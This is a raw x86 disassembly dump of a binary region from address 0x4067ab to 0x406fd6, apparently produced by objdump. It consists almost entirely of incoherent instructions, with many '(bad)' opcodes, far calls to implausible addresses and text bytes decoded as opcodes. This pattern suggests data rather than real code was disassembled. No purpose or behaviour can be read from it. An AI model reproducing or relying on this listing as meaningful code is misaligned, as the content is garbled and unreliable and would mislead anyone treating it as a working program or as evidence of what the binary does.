  4067ab:	add    al,0x4
  4067ad:	add    al,0x4
  4067af:	add    al,0x4
  4067b1:	add    al,0x75
  4067b3:	jne    0x406784
  4067b5:	test   DWORD PTR [ecx+0x2f],ebp
  4067b8:	sub    edx,DWORD PTR [ebx-0x2052a8c8]
  4067be:	mov    eax,ds:0xf380d9ab
  4067c3:	enter  0x5b7b,0xf0
  4067c7:	sub    eax,0x4cc008de
  4067cc:	jne    0x406843
  4067ce:	xor    cl,BYTE PTR [edx]
  4067d0:	jne    0x406847
  4067d2:	add    ebx,DWORD PTR [ebp+esi*2+0x69c8e775]
  4067d9:	out    0xdc,al
  4067db:	fsubr  st,st(7)
  4067dd:	cdq    
  4067de:	popa   
  4067df:	xor    eax,0x5ecbd054
  4067e4:	xchg   DWORD PTR [ecx-0x5e],edx
  4067e7:	in     eax,0x25
  4067e9:	dec    ecx
  4067ea:	sub    DWORD PTR [esi-0x8acab5],esi
  4067f0:	shl    BYTE PTR [edi+0xb],0xad
  4067f4:	(bad)  
  4067f5:	(bad)  
  4067f6:	dec    DWORD PTR [ebx+ebp*4-0x7a]
  4067fa:	fld    DWORD PTR [ecx+0x72]
  4067fd:	sub    bl,bl
  4067ff:	inc    edx
  406800:	xchg   DWORD PTR ds:0x1623e2f2,ebx
  406806:	test   DWORD PTR gs:[eax-0x67],ebp
  40680a:	or     cl,dl
  40680c:	mov    al,ds:0xcfb2f75c
  406812:	inc    edx
  406813:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406814:	icebp  
  406815:	xlat   BYTE PTR ds:[ebx]
  406816:	fsub   st,st(3)
  406818:	push   ds
  406819:	sbb    bh,bh
  40681b:	jmp    FWORD PTR [esi]
  40681d:	add    edi,edi
  40681f:	(bad)  
  406820:	inc    DWORD PTR [eax]
	...
  40682a:	pop    ebx
  40682b:	pop    esi
  40682c:	mov    ah,0x74
  40682e:	je     0x4068a4
  406830:	je     0x4068a6
  406832:	je     0x4068a8
  406834:	je     0x4068aa
  406836:	add    BYTE PTR [eax],al
  406838:	nop
  406839:	mov    gs,WORD PTR [eax]
  40683b:	cli    
  40683c:	loopne 0x4067ff
  40683e:	hlt    
  40683f:	aam    0xc0
  406841:	jbe    0x406833
  406843:	add    al,0x59
  406845:	fisub  WORD PTR [ebx]
  406847:	cmp    eax,0x36a169c5
  40684c:	adc    ebx,DWORD PTR [esi-0x46]
  40684f:	xor    al,0x0
  406851:	add    bh,bh
  406853:	add    esp,edi
  406855:	dec    ebp
  406856:	mov    eax,ds:0x1752da37
  40685b:	addr16 cmp al,0x78
  40685e:	mov    esi,edi
  406860:	fcom   QWORD PTR [ebp+0x50]
  406863:	dec    edi
  406864:	xlat   BYTE PTR ds:[ebx]
  406865:	mov    ds:0x79b0d566,al
  40686a:	xchg   esi,eax
  40686b:	jno    0x4068dd
  40686d:	push   ss
  40686e:	imul   eax,DWORD PTR [eax],0x0
  406871:	pushf  
  406872:	das    
  406873:	in     eax,dx
  406874:	add    BYTE PTR [eax],al
  406876:	adc    ecx,ebx
  406878:	inc    DWORD PTR [eax]
  40687a:	mov    esp,DWORD PTR [esp+esi*1-0x19]
  40687e:	add    al,0xdb
  406880:	out    0xde,al
  406882:	xor    eax,0x13244ddb
  406887:	enter  0xc59a,0xd8
  40688b:	imul   eax,DWORD PTR [ebp+0x22],0x8bd10a9a
  406892:	mov    WORD PTR [ebx+0x1a5c8b8b],cs
  406898:	mov    ecx,DWORD PTR [ebx-0x747402f9]
  40689e:	mov    eax,DWORD PTR [ebx-0x7c7c7c7d]
  4068a4:	add    DWORD PTR [ebx-0x58317c7d],0xffffffc1
  4068ab:	(bad)  
  4068ad:	jle    0x406864
  4068af:	arpl   WORD PTR [edi+eiz*2+0x45335d64],si
  4068b6:	div    DWORD PTR [ecx-0x78]
  4068b9:	push   ss
  4068ba:	neg    BYTE PTR [edx]
  4068bc:	cs popa 
  4068be:	ficomp WORD PTR [edx]
	...
  4068c8:	add    BYTE PTR [ecx-0x2772d477],cl
  4068ce:	mov    ebx,0xbcf48989
  4068d3:	lahf   
  4068d4:	pop    edx
  4068d5:	mov    al,ds:0xde1c360c
  4068da:	mov    dl,0xfb
  4068dc:	sub    ebp,DWORD PTR [ebx-0xc]
  4068df:	cwde   
  4068e0:	push   ss
  4068e1:	adc    esi,edx
  4068e3:	dec    ecx
  4068e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068e5:	(bad)  
  4068e7:	mov    edx,0x1eba945
  4068ec:	ds hlt 
  4068ee:	bnd jmp 0x4068d0
  4068f1:	ds push ecx
  4068f3:	push   0x8508989
  4068f8:	mov    DWORD PTR [ecx-0x76702e4e],ecx
  4068fe:	mov    DWORD PTR [esi+eiz*2-0xd],eax
  406902:	dec    eax
  406903:	dec    esi
  406904:	and    eax,0x7a067e26
  406909:	retf   
  40690a:	loopne 0x40689c
  40690c:	test   ecx,esp
  40690e:	cli    
  40690f:	cmp    esi,ebx
  406911:	sbb    eax,0xccc64804
  406916:	dec    ebx
  406917:	mov    DWORD PTR [ecx+0x72c8389],ecx
  40691d:	inc    edi
  40691e:	and    eax,0x8861c83c
  406923:	(bad)
  406926:	sbb    dh,dl
  406928:	nop
  406929:	fadd   DWORD PTR [ebx-0x2476f095]
  40692f:	std    
  406930:	pop    ss
  406931:	sub    al,BYTE PTR [eax]
  406933:	das    
  406934:	ret    0xe382
  406937:	mov    DWORD PTR [ecx-0x76079c1a],ecx
  40693d:	mov    DWORD PTR [ecx+0xf0f0f0f],ecx
  406943:	(bad)  
  406944:	(bad)  
  406945:	(bad)  
  406946:	(bad)  
  406947:	(bad)  
  406949:	cmc    
  40694a:	add    DWORD PTR ds:[ebx+0x65838383],0x6d
  406952:	push   eax
  406953:	inc    esi
  406954:	or     eax,0x20222865
  406959:	jo     0x4069ca
  40695b:	and    BYTE PTR gs:[edi+0x79],ch
  40695f:	jo     0x40696e
  406961:	and    BYTE PTR [ebx+0x69],dl
  406964:	jae    0x4069d3
  406966:	gs jb  0x4069cc
  406969:	je     0x4069d0
  40696b:	arpl   WORD PTR [ecx+edi*2],di
  40696e:	imul   esp,DWORD PTR [ebx+0x67],0x6d2e7220
  406975:	cmp    ch,BYTE PTR cs:[ecx+0x75]
  406979:	outs   dx,DWORD PTR ds:[esi]
  40697a:	jo     0x4069f2
  40697c:	outs   dx,DWORD PTR ds:[esi]
  40697d:	or     dh,BYTE PTR cs:[ebx+0x2e]
  406981:	cs cmp eax,0x53577361
  406987:	add    DWORD PTR [ebx+0x45458383],0x2e
  40698e:	cmc    
  40698f:	jo     0x40694e
  406991:	rcl    BYTE PTR [edi+eax*8],0x3e
  406995:	adc    edx,DWORD PTR [edx+0x7dd01305]
  40699b:	mov    DWORD PTR [ecx+0x226f1479],0x392fc2e1
  4069a5:	inc    ebp
  4069a6:	inc    ebp
  4069a7:	xchg   ebp,eax
  4069a8:	ds inc ebp
  4069aa:	inc    ebp
  4069ab:	pop    esp
  4069ac:	pop    edx
  4069ad:	inc    ebp
  4069ae:	inc    ebp
  4069af:	out    0x82,eax
  4069b1:	jns    0x406a2e
  4069b3:	imul   eax,DWORD PTR [ebx-0x1e],0x52
  4069b7:	add    eax,0x58c68a81
  4069bc:	loopne 0x4069c8
  4069be:	icebp  
  4069bf:	mov    DWORD PTR [edi+0x26],ecx
  4069c2:	push   eax
  4069c3:	jmp    0x455eb510
  4069c8:	jne    0x4069e8
  4069ca:	pop    esp
  4069cb:	lea    ebx,[ebp+0x75]
  4069ce:	jne    0x406a45
  4069d0:	push   ecx
  4069d1:	mov    eax,ds:0xdb7dcae3
  4069d6:	cs sbb ebx,edi
  4069d9:	xchg   esi,eax
  4069da:	jmp    0x8e880e2e
  4069df:	fsubr  QWORD PTR [esi+0x5c]
  4069e2:	stc    
  4069e3:	leave  
  4069e4:	je     0x406973
  4069e6:	rol    esp,0xe6
  4069e9:	mov    dl,0x83
  4069eb:	or     cl,dh
  4069ed:	adc    bh,ch
  4069ef:	dec    esp
  4069f0:	(bad)  
  4069f1:	icebp  
  4069f2:	popf   
  4069f3:	jne    0x406a6a
  4069f5:	jge    0x406a17
  4069f7:	jne    0x406a6e
  4069f9:	jne    0x4069fb
	...
  406a03:	data16 cmp cl,dl
	...
  406a0e:	add    bh,bh
  406a10:	inc    ebx
  406a12:	adc    DWORD PTR [esi+eax*8],eax
  406a15:	jo     0x406a3b
  406a17:	pop    edx
  406a18:	ffreep st(6)
  406a1a:	and    ch,BYTE PTR [ebp+0x6ae27fe1]
  406a20:	enter  0xe036,0xb4
  406a24:	in     eax,0x30
  406a26:	adc    al,0xe9
  406a28:	scas   eax,DWORD PTR es:[edi]
  406a29:	(bad)  
  406a2a:	jmp    FWORD PTR [ecx]
  406a2c:	cmp    edx,DWORD PTR [edi+ecx*4-0x3d]
  406a30:	and    ah,0xa3
  406a33:	fcmovne st,st(0)
  406a35:	(bad)  
  406a36:	fwait
  406a37:	mov    BYTE PTR [edi-0x7a],ah
  406a3a:	dec    eax
  406a3b:	lods   eax,DWORD PTR ds:[esi]
  406a3c:	sub    DWORD PTR [ecx+0x37],edx
  406a3f:	push   esi
  406a40:	xchg   ecx,eax
  406a41:	jno    0x406a12
  406a43:	mov    cl,0x5d
  406a45:	adc    al,bh
  406a47:	mov    edi,edi
  406a49:	call   DWORD PTR [edi]
  406a4b:	not    BYTE PTR [ecx-0x1]
  406a4e:	(bad)  
  406a4f:	mov    ebx,0x8dff92b9
  406a54:	adc    al,0xfd
  406a56:	push   edi
  406a57:	lea    ebx,[ebx]
  406a59:	pop    ecx
  406a5a:	int3   
  406a5b:	jmp    0x4069ea
  406a5d:	sbb    bl,BYTE PTR [eax+0x52]
  406a60:	push   esi
  406a61:	rcr    BYTE PTR [eax],0x9d
  406a64:	out    0x24,eax
  406a66:	pop    ecx
  406a67:	das    
  406a68:	fimul  WORD PTR [eax-0x7272c168]
  406a6e:	lea    esi,ds:0xb18d8d52
  406a74:	or     al,0x8d
  406a76:	lea    ecx,[ebp-0x1]
  406a7c:	(bad)  
  406a7d:	(bad)  
  406a7e:	(bad)  
  406a7f:	(bad)  
  406a80:	push   DWORD PTR [edi-0x48]
  406a83:	sub    DWORD PTR [esi-0x2b],ecx
  406a86:	push   esp
  406a87:	jl     0x406a9b
  406a89:	adc    al,0xdf
  406a8b:	push   ebx
  406a8c:	shr    DWORD PTR [ebp-0x1bbfed86],1
  406a92:	clc    
  406a93:	lds    ecx,FWORD PTR [edx+0x57]
  406a96:	mov    DWORD PTR [eax+0x67],eax
  406a9c:	add    BYTE PTR [eax],al
  406a9e:	add    BYTE PTR [eax],al
  406aa0:	add    BYTE PTR [eax],al
  406aa2:	add    al,0x4
  406aa4:	das    
  406aa5:	popf   
  406aa6:	call   0x9f446f57
  406aab:	call   0x1b1c3c28
  406ab0:	push   0xfa6d0341
  406ab5:	add    al,BYTE PTR [edx]
  406ab7:	add    al,0xe8
  406ab9:	add    al,0x7c
  406abb:	stc    
  406abc:	dec    eax
  406abd:	or     edx,edi
  406abf:	enter  0xdd07,0xbf
  406ac3:	push   edx
  406ac4:	ja     0x406ab6
  406ac6:	xor    edx,DWORD PTR [esi+0x7d69fce1]
  406acc:	mov    esi,0x43a80404
  406ad1:	add    al,0x4
  406ad3:	xor    al,0x7f
  406ad5:	cmc    
  406ad6:	add    al,0x89
  406ad8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ad9:	cmp    edi,DWORD PTR [edx-0x7b]
  406adc:	mov    bl,0xd
  406ade:	retf   
  406adf:	dec    esi
  406ae0:	arpl   di,ax
  406ae2:	stos   DWORD PTR es:[edi],eax
  406ae3:	cmp    eax,0x8738c67
  406ae8:	adc    al,0xa7
  406aea:	mov    al,ds:0xaefb00c
  406aef:	mov    eax,ds:0x31898989
  406af4:	adc    cl,bh
  406af6:	aas    
  406af7:	lods   al,BYTE PTR ds:[esi]
  406af8:	(bad)  
  406af9:	stos   BYTE PTR es:[edi],al
  406afa:	mov    cl,dh
  406afc:	sbb    DWORD PTR [eax+0x35308f6c],0x3f7c5b36
  406b06:	sub    eax,0x89f3dddb
  406b0b:	dec    ecx
  406b0c:	stos   DWORD PTR es:[edi],eax
  406b0d:	sub    bh,BYTE PTR [ecx]
  406b0f:	pop    esp
  406b10:	mov    DWORD PTR [ecx-0x76ec116e],ecx
  406b16:	mov    DWORD PTR [ecx+0x673d0000],ecx
  406b1c:	bound  edi,QWORD PTR [edx]
  406b1e:	data16 and BYTE PTR [eax],ah
  406b21:	or     dh,BYTE PTR [ebx+0x73]
  406b24:	ins    DWORD PTR es:[edi],dx
  406b25:	outs   dx,DWORD PTR ds:[esi]
  406b26:	outs   dx,BYTE PTR ds:[esi]
  406b27:	and    esp,DWORD PTR [eax]
  406b29:	push   ebx
  406b2a:	or     eax,0xd57666f
  406b2f:	bound  ebp,QWORD PTR [ecx]
  406b31:	or     ah,BYTE PTR [eax]
  406b33:	jb     0x406b55
  406b35:	inc    esp
  406b36:	ds cs gs jae 0x406b7d
  406b3b:	js     0x406bad
  406b3d:	arpl   WORD PTR [ebp+0x20],sp
  406b40:	ds ins DWORD PTR es:[edi],dx
  406b42:	gs gs popa 
  406b45:	bound  esi,QWORD PTR [edx+0x66]
  406b48:	gs or  eax,0x6d2e3e63
  406b4e:	gs jb  0x406b71
  406b51:	jo     0x406ba0
  406b53:	jo     0x406b62
  406b55:	and    BYTE PTR [ebp+0x6e],ch
  406b58:	imul   esi,DWORD PTR [ebx+0x76],0x6c236965
  406b5f:	bound  esp,QWORD PTR [ebx+0x62]
  406b62:	jb     0x406b6e
  406b64:	inc    ecx
  406b65:	bound  eax,QWORD PTR gs:[eax]
  406b68:	add    BYTE PTR [eax],al
  406b6a:	add    BYTE PTR [eax],al
  406b6c:	add    BYTE PTR [eax],al
  406b6e:	or     dl,cl
  406b70:	jl     0x406bdc
  406b72:	push   0x6a
  406b74:	push   0x6a
  406b76:	push   0x6a
  406b78:	push   0x6a
  406b7a:	and    al,0x24
  406b7c:	dec    ecx
  406b7d:	fisttp WORD PTR [ecx-0x4a]
  406b80:	fmul   QWORD PTR [edi+0x41]
  406b83:	adc    esp,ebx
  406b85:	retf   
  406b86:	inc    ecx
  406b87:	test   al,0xd0
  406b89:	push   0xffffffbc
  406b8b:	aam    0xc3
  406b8d:	test   DWORD PTR [ebx-0x17e2edd8],0x4424242c
  406b97:	adc    ah,BYTE PTR [esp]
  406b9a:	mov    ebp,DWORD PTR [esi-0x7310dbdc]
  406ba0:	inc    eax
  406ba1:	shl    ebx,0xd3
  406ba4:	js     0x406b69
  406ba6:	add    BYTE PTR [edi],0x6d
  406ba9:	and    BYTE PTR [esi+0x6a316a7],bh
  406baf:	push   cx
  406bb1:	xor    dh,BYTE PTR [ecx-0x2d]
  406bb4:	and    eax,0xc60024b4
  406bb9:	popf   
  406bba:	popa   
  406bbb:	cmp    al,0x0
  406bbd:	add    BYTE PTR [eax],al
  406bbf:	jmp    0x406bb1
  406bc1:	push   ebx
  406bc2:	imul   ecx,DWORD PTR [ecx],0x16
  406bc5:	les    ecx,FWORD PTR [edx+0x7a]
  406bc8:	aad    0xa5
  406bca:	push   ebx
  406bcb:	or     BYTE PTR [eax+eiz*4-0x3f3761f1],cl
  406bd2:	mov    WORD PTR [eax+0x79],?
  406bd5:	(bad)  
  406bd6:	sub    DWORD PTR [edx-0x1e],ebx
  406bd9:	mov    ecx,0x49c6d2ee
  406bde:	repnz xchg ecx,eax
  406be0:	jne    0x406bd7
  406be2:	add    BYTE PTR [eax],al
  406be4:	(bad)  
  406be5:	jecxz  0x406be7
  406be7:	add    BYTE PTR [eax],al
  406be9:	(bad)  
  406bea:	(bad)  
  406beb:	(bad)  
  406bec:	(bad)  
  406bed:	(bad)  
  406bee:	(bad)  
  406bef:	(bad)  
  406bf0:	(bad)  
  406bf1:	call   ebp
  406bf3:	and    ebp,eax
  406bf5:	push   0x6a
  406bf7:	push   0x6a
  406bf9:	push   0x6a
  406bfb:	push   0x6a
  406bfd:	push   0xffffff8b
  406bff:	mov    esi,DWORD PTR ds:0x79cb5fc2
  406c05:	pop    ecx
  406c06:	or     edi,DWORD PTR [ecx-0x608840c1]
  406c0c:	fidiv  DWORD PTR [edx]
  406c0e:	imul   ebx,DWORD PTR [edi-0x37647e20],0x8f529def
  406c18:	mov    ecx,DWORD PTR [ebx+0x227c164b]
  406c1e:	stos   BYTE PTR es:[edi],al
  406c1f:	sti    
  406c20:	mov    edi,0x256624dd
  406c25:	adc    ebp,DWORD PTR [ecx+0x713ea150]
  406c2b:	aad    0x7
  406c2d:	(bad)  
  406c2e:	loopne 0x406c7b
  406c30:	lahf   
  406c31:	add    al,0x33
  406c33:	pop    edi
  406c34:	mov    ebp,0x8b8b9e85
  406c39:	js     0x406c21
  406c3b:	add    eax,0x855f8b8b
  406c40:	jo     0x406bcd
  406c42:	mov    DWORD PTR [ebx-0x7b],edx
  406c45:	in     al,dx
  406c46:	xor    DWORD PTR [ebp+0x5785603e],edx
  406c4c:	cmp    esp,edi
  406c4e:	into   
  406c4f:	add    eax,0x9f488135
  406c54:	adc    edi,ebx
  406c56:	scas   eax,DWORD PTR es:[edi]
  406c57:	rol    ah,0xf1
  406c5a:	test   BYTE PTR [ecx+0x29688989],0x89
  406c61:	mov    esp,ebp
  406c63:	jmp    0x406bee
  406c65:	mov    DWORD PTR [ecx+0x0],ecx
  406c6b:	add    BYTE PTR [eax],al
  406c6d:	add    BYTE PTR [eax],al
  406c6f:	add    BYTE PTR [eax-0x4e9e589],dl
  406c75:	pop    eax
  406c76:	lods   eax,DWORD PTR ds:[esi]
  406c77:	jp     0x406c3c
  406c79:	mov    ss,WORD PTR [edx+0xa8ba167]
  406c7f:	inc    ebx
  406c80:	add    DWORD PTR [eax+0x2],0xbebfed24
  406c87:	mov    ah,0x0
	...
  406c91:	add    BYTE PTR [eax],al
  406c93:	sub    DWORD PTR [edi-0x63],0x14
  406c97:	add    BYTE PTR [eax],al
  406c99:	jl     0x406c7a
  406c9b:	lds    eax,FWORD PTR [esi]
  406c9d:	push   ds
  406c9e:	pusha  
  406c9f:	stos   BYTE PTR es:[edi],al
  406ca0:	push   eax
  406ca1:	aad    0x85
  406ca3:	adc    cl,BYTE PTR [ecx-0x277c0efb]
  406ca9:	jo     0x406d2a
  406cab:	mov    bl,0x4
  406cad:	into   
  406cae:	push   esp
  406caf:	push   ecx
  406cb0:	rol    DWORD PTR [esp+ecx*1-0x1c1526aa],1
  406cb7:	nop
  406cb8:	xchg   edi,eax
  406cb9:	in     al,dx
  406cba:	out    dx,eax
  406cbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406cbc:	add    BYTE PTR [eax],al
  406cbe:	inc    ebp
  406cbf:	scas   al,BYTE PTR es:[edi]
  406cc0:	add    BYTE PTR [eax],al
  406cc2:	call   0xa444:0x7500da91
  406cc9:	les    esi,FWORD PTR [eax+0x3b5a17cc]
  406ccf:	inc    ebp
  406cd0:	mov    ds,WORD PTR [ecx-0x74337f28]
  406cd6:	fwait
  406cd7:	jp     0x406ca7
  406cd9:	je     0x406cbf
  406cdb:	mov    dh,0x3a
  406cdd:	push   ebx
  406cde:	fwait
  406cdf:	jne    0x406d56
  406ce1:	jne    0x406d2a
  406ce3:	icebp  
  406ce4:	add    esp,ecx
  406ce6:	jo     0x406ce5
  406ce8:	retf   
  406ce9:	mov    ds:0x11bf1735,al
  406cee:	out    dx,eax
  406cef:	jmp    DWORD PTR [edx-0x52]
  406cf2:	imul   esi,DWORD PTR [eax],0xbebe6776
  406cf8:	shl    BYTE PTR [edi-0x1fc2c95e],cl
  406cfe:	add    esi,DWORD PTR [ebp+0x75]
  406d01:	(bad)  
  406d02:	and    DWORD PTR [eax-0x748a8a8b],0xffffff8b
  406d09:	mov    ecx,DWORD PTR [ebx-0x74747475]
  406d0f:	mov    esi,DWORD PTR [esi+esi*8]
  406d12:	sub    edi,edi
  406d14:	(bad)  
  406d15:	(bad)  
  406d16:	(bad)  
  406d17:	(bad)  
  406d18:	(bad)  
  406d19:	(bad)  
  406d1a:	(bad)  
  406d1b:	inc    DWORD PTR [eax]
  406d1d:	add    BYTE PTR [edx+eax*1],dl
  406d20:	mov    bh,0x26
  406d22:	xor    al,0xd4
  406d24:	sahf   
  406d25:	rcl    DWORD PTR [eax-0x5e],cl
  406d28:	mov    edi,0x6051c3ad
  406d2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406d2e:	dec    esi
  406d2f:	add    dl,BYTE PTR [esi+edi*2+0x42]
  406d33:	(bad)  
  406d34:	mov    ds:0xaa00001c,eax
  406d39:	in     al,0x0
  406d3b:	add    BYTE PTR [eax*2+0x71430000],al
  406d42:	dec    ebx
  406d43:	xor    DWORD PTR [esi-0x76],esi
  406d46:	leave  
  406d47:	sbb    al,0x97
  406d49:	adc    al,0x80
  406d4b:	repnz rcr BYTE PTR ss:[eax+0x25],0x66
  406d51:	sbb    ch,dh
  406d53:	lock mov ebx,0xf71b84
  406d59:	call   0xeff5ac0c
  406d5e:	call   0x3605564b
  406d63:	out    0x3c,eax
  406d65:	fwait
  406d66:	add    ebx,esi
  406d68:	mov    edi,0xbc59ec02
  406d6d:	pop    ds
  406d6e:	inc    edx
  406d6f:	xor    ch,BYTE PTR [eax]
  406d71:	pop    edi
  406d72:	xor    DWORD PTR [ebx+0xe],eax
  406d75:	shl    BYTE PTR [ebx-0x16],1
  406d78:	pop    edx
  406d79:	mov    ds:0x9344a90f,al
  406d7e:	je     0x406d06
  406d80:	and    al,BYTE PTR [eax+edi*8+0x7ae8e866]
  406d87:	sub    ebp,eax
  406d89:	call   0xcd0d3a76
  406d8e:	int3   
  406d8f:	int3   
  406d90:	int3   
  406d91:	int3   
  406d92:	int3   
  406d93:	int3   
  406d94:	mov    eax,0x7474af57
  406d99:	je     0x406e0f
  406d9b:	je     0x406e11
  406d9d:	je     0x406e13
  406d9f:	je     0x406d26
  406da1:	test   DWORD PTR [ebp+0x22576f61],ecx
  406da7:	dec    esp
  406da8:	push   edi
  406da9:	ins    DWORD PTR es:[edi],dx
  406daa:	jae    0x406de6
  406dac:	imul   esi,DWORD PTR [edx+0x6e],0x76536e20
  406db3:	and    BYTE PTR [ecx+0x28],ah
  406db6:	cs jb  0x406e26
  406db9:	outs   dx,BYTE PTR gs:[esi]
  406dbb:	imul   esi,DWORD PTR [eax+eiz*1+0x65],0x2f2c666f
  406dc3:	jbe    0x406de8
  406dc5:	outs   dx,BYTE PTR ds:[esi]
  406dc6:	bound  esi,QWORD PTR [ebx+0x3e]
  406dc9:	and    BYTE PTR [edx],bh
  406dcb:	gs inc esp
  406dcd:	ins    DWORD PTR es:[edi],dx
  406dce:	ds gs jae 0x406e29
  406dd2:	and    BYTE PTR [ebp+0x61],ch
  406dd5:	and    dh,BYTE PTR [esi+0x70]
  406dd8:	imul   ebp,DWORD PTR gs:[esi],0x74732953
  406ddf:	gs ins DWORD PTR es:[edi],dx
  406de1:	or     ah,BYTE PTR [ebp+0x72]
  406de4:	je     0x406e4a
  406de6:	outs   dx,BYTE PTR ds:[esi]
  406de7:	rol    BYTE PTR ds:[edx+eax*2-0xaec22ef],1
  406def:	pop    ecx
  406df0:	mov    ds:0x197b2ea8,al
  406df5:	mov    eax,0xb0685b30
  406dfa:	sbb    BYTE PTR [edi],dl
  406dfc:	or     DWORD PTR [ecx],eax
  406dfe:	test   DWORD PTR [ebp-0x286f184c],eax
  406e04:	addr16 popa 
  406e06:	cs cdq 
  406e08:	out    0x4f,al
  406e0a:	nop
  406e0b:	and    ch,BYTE PTR [ecx]
  406e0d:	and    DWORD PTR [ebp+0x4a],ebx
  406e10:	call   0x2244:0x9abad4a3
  406e17:	sub    al,0x80
  406e19:	stos   BYTE PTR es:[edi],al
  406e1a:	ins    DWORD PTR es:[edi],dx
  406e1b:	adc    dl,BYTE PTR [eax*4-0x303cec7b]
  406e22:	test   DWORD PTR [ebp-0x7ac47774],eax
  406e28:	add    al,0x55
  406e2a:	xchg   ecx,eax
  406e2b:	(bad)  
  406e2c:	cmp    DWORD PTR [edx-0x7f],esp
  406e2f:	test   eax,0x3840cf73
  406e34:	mov    esi,0x6392fbee
  406e39:	test   eax,0x274429d5
  406e3e:	xor    eax,0x404fc1d
  406e43:	add    al,0x9a
  406e45:	call   0x404:0xca1e0404
  406e4c:	add    al,0x8b
  406e4e:	mov    ecx,DWORD PTR [ebx-0x74747475]
  406e54:	mov    ecx,DWORD PTR [ebx+0x7955fb3b]
  406e5a:	fiadd  DWORD PTR [eax-0x5ff38c5e]
  406e60:	in     al,0x99
  406e62:	lea    eax,[ebx+edi*8-0x30429a4b]
  406e69:	mov    al,ds:0xea7b0de4
	...
  406e76:	add    BYTE PTR [ebx+0x61c0d083],al
  406e7c:	cwde   
  406e7d:	add    DWORD PTR [ebx+0x181b91d8],0x48
  406e84:	loope  0x406e87
  406e86:	mov    cl,0x35
  406e88:	dec    ecx
  406e89:	jae    0x406e58
  406e8b:	xchg   esi,eax
  406e8c:	stos   DWORD PTR es:[edi],eax
  406e8d:	dec    esi
  406e8e:	jns    0x406ed3
  406e90:	sbb    BYTE PTR [ebx+0x7c],0xc9
  406e94:	push   edi
  406e95:	call   0xe8d1273e
  406e9a:	push   esi
  406e9b:	test   BYTE PTR [ebx+0x760b4d63],0x87
  406ea2:	add    DWORD PTR [ebx-0x7c7c7f1a],0x18
  406ea9:	xor    al,0x7d
  406eab:	xor    DWORD PTR [ebp+0xc],0x6d
  406eaf:	xchg   esi,eax
  406eb0:	mov    WORD PTR [edx],gs
  406eb2:	dec    edi
  406eb3:	lds    edi,FWORD PTR [ecx-0x23]
  406eb6:	mov    eax,0x5e779bad
  406ebb:	ins    DWORD PTR es:[edi],dx
  406ebc:	pop    eax
  406ebd:	lods   al,BYTE PTR ds:[esi]
  406ebe:	sbb    edi,DWORD PTR [bp+si]
  406ec1:	cmc    
  406ec2:	push   0x9
  406ec4:	jno    0x406f3b
  406ec6:	jne    0x406f3d
  406ec8:	sub    BYTE PTR [edx-0x46],0x2
  406ecc:	leave  
  406ecd:	out    dx,al
  406ece:	adc    BYTE PTR [edx],dh
  406ed0:	repnz or eax,0x9ebe5199
  406ed6:	mov    ebx,0x5f88980b
  406edb:	adc    dh,dh
  406edd:	mov    BYTE PTR ds:0xe4492c2a,cl
  406ee3:	mov    esp,0x51757541
  406ee8:	out    dx,al
  406ee9:	push   ds
  406eea:	jne    0x406f61
  406eec:	jne    0x406ed6
  406eee:	call   0xe92957db
  406ef3:	call   0x94c057e0
  406ef8:	js     0x406efa
	...
  406f02:	jne    0x406f79
  406f04:	and    DWORD PTR fs:[esi-0x13adb783],ecx
  406f0b:	outs   dx,DWORD PTR ds:[esi]
  406f0c:	adc    al,0x5b
  406f0e:	jne    0x406f36
  406f10:	clc    
  406f11:	pop    esi
  406f12:	xchg   ebx,eax
  406f13:	jne    0x406f25
  406f15:	push   ds
  406f16:	iret   
  406f17:	jbe    0x406eb5
  406f19:	or     dl,bh
  406f1b:	bnd jne 0x406f93
  406f1e:	outs   dx,BYTE PTR ds:[esi]
  406f1f:	retf   0x7575
  406f22:	mov    esi,esp
  406f24:	jne    0x406f9b
  406f26:	mov    ch,0xf0
  406f28:	outs   dx,DWORD PTR ds:[esi]
  406f29:	fsubr  QWORD PTR cs:[ebx+esi*1-0x1b]
  406f2e:	add    DWORD PTR [edx+edi*2],0x2d82dbd3
  406f35:	or     esi,DWORD PTR [edi-0x2ac62ab5]
  406f3b:	lock inc eax
  406f3d:	mov    ch,0x75
  406f3f:	mov    ecx,DWORD PTR [edi]
  406f41:	fnstenv [edx+eax*2-0x75]
  406f45:	mov    ecx,DWORD PTR [ebx-0x2812fcc2]
  406f4b:	mov    al,0xce
  406f4d:	push   cs
  406f4e:	push   esi
  406f4f:	mov    edi,0x30cc3de7
  406f54:	xor    DWORD PTR [eax-0x57adc718],ebx
  406f5a:	jnp    0x406f2b
  406f5c:	add    eax,0xa3ab6908
  406f61:	out    dx,al
  406f62:	mov    edi,0x7445e93e
  406f67:	jae    0x406fda
  406f69:	into   
  406f6a:	mov    ecx,DWORD PTR [ebx-0x7474aa9c]
  406f70:	mov    ebp,DWORD PTR [edx+0x6a]
  406f73:	push   0x6a
  406f75:	push   0x6a
  406f77:	push   0x6a
  406f79:	push   0x14
  406f7b:	stc    
  406f7c:	aas    
  406f7d:	int3   
  406f7e:	int3   
  406f7f:	int3   
  406f80:	int3   
  406f81:	int3   
  406f82:	int3   
  406f83:	int3   
  406f84:	int3   
  406f85:	int3   
  406f86:	call   0x85c59d73
  406f8b:	jecxz  0x406f5a
  406f8d:	stos   BYTE PTR es:[edi],al
  406f8e:	call   0x8532d387
  406f93:	mov    al,0x30
  406f95:	cld    
  406f96:	xor    ecx,DWORD PTR [ecx]
  406f98:	xchg   ebx,eax
  406f99:	mov    BYTE PTR [esi-0x71b43a2e],ah
  406f9f:	pop    ebx
  406fa0:	call   0x799fe38d
  406fa5:	mov    edi,0xbbff0008
  406faa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406fab:	adc    eax,0xf5d59b1f
  406fb0:	lods   al,BYTE PTR ds:[esi]
  406fb1:	xor    al,0x37
  406fb3:	push   ss
  406fb4:	test   BYTE PTR [edi+0x236a73e3],0x53
  406fbb:	pop    edi
  406fbc:	call   0xe928a384
  406fc1:	xchg   ecx,eax
  406fc2:	jle    0x406f85
  406fc4:	call   0x236913b1
  406fc9:	call   0xf5c218cd
  406fce:	push   edx
  406fcf:	push   0x9d50f497
  406fd4:	lods   eax,DWORD PTR ds:[esi]
  406fd5:	dec    ecx
  406fd6:	dec    eax
